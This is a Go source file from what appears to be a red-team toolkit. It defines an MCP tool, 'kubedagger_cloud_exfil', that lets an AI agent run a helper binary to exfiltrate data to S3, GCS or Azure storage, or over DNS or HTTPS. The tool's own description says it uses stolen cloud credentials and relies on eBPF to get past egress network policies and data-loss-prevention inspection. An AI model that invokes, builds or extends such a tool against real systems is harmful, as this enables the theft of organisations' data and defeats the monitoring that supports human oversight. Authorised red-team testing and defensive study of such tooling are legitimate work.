package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type CloudExfilInput struct {
	Method      string `json:"method"`
	Destination string `json:"destination,omitempty"`
	Source      string `json:"source,omitempty"`
	BucketName  string `json:"bucket_name,omitempty"`
	Region      string `json:"region,omitempty"`
	ChunkSize   int    `json:"chunk_size,omitempty"`
}

type CloudExfilTool struct {
	exec executor.Executor
}

func NewCloudExfil(exec executor.Executor) *CloudExfilTool {
	return &CloudExfilTool{exec: exec}
}

func (t *CloudExfilTool) Name() string { return "kubedagger_cloud_exfil" }

func (t *CloudExfilTool) Description() string {
	return "Exfiltrate data to cloud storage using stolen cloud credentials. Supports S3, GCS, and Azure Blob Storage. Uses eBPF to bypass egress network policies and DLP inspection."
}

func (t *CloudExfilTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"method": {
				"type": "string",
				"enum": ["s3", "gcs", "azure-blob", "dns", "https"],
				"description": "Exfiltration method/destination type"
			},
			"destination": {
				"type": "string",
				"description": "Destination URL or identifier"
			},
			"source": {
				"type": "string",
				"description": "Source path or data identifier to exfiltrate"
			},
			"bucket_name": {
				"type": "string",
				"description": "Cloud storage bucket name"
			},
			"region": {
				"type": "string",
				"description": "Cloud region for the storage bucket"
			},
			"chunk_size": {
				"type": "integer",
				"description": "Chunk size in bytes for split transfer"
			}
		},
		"required": ["method"]
	}`)
}

func (t *CloudExfilTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CloudExfilInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Destination, "destination"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Source, "source"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.BucketName, "bucket_name"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"cloud", "exfil", "--method", input.Method}
	if input.Destination != "" {
		args = append(args, "--destination", input.Destination)
	}
	if input.Source != "" {
		args = append(args, "--source", input.Source)
	}
	if input.BucketName != "" {
		args = append(args, "--bucket", input.BucketName)
	}
	if input.Region != "" {
		args = append(args, "--region", input.Region)
	}
	if input.ChunkSize > 0 {
		args = append(args, "--chunk-size", fmt.Sprintf("%d", input.ChunkSize))
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger cloud exfil failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Cloud Exfiltration: %s\n\n", input.Method)
	if output == "" {
		sb.WriteString("Exfiltration complete.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
